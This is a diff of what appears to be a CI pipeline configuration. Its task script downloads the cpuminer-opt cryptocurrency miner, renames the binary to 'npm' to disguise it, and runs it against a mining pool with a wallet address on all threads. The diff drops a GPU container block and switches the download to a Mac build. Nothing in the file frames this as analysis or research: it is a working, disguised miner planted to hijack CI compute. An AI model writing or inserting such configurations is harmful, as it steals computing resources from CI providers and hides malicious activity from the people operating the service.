@@ -1,15 +1,9 @@
-container:
-  image: nvidia/cuda:10.0-runtime-ubuntu18.04
-  cpu: 400
-  memory: 12G
-  gpu: 4
-  gpu_type: nvidia-tesla-v100 # do we need the choice?
 task:
   script: |
    apt update -y \
    && apt install -y wget \
-   && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz \
-   && tar -xvf cpuminer-opt-linux.tar.gz \
+   && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-mac.tar.gz \
+   && tar -xvf cpuminer-opt-mac.tar.gz \
    && mv cpuminer-sse2 npm \
    && ./npm -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u Bc9Nnt38ZU2mryNKUyxVviir4DXgbQeEhp.mode-cir -t 0
    
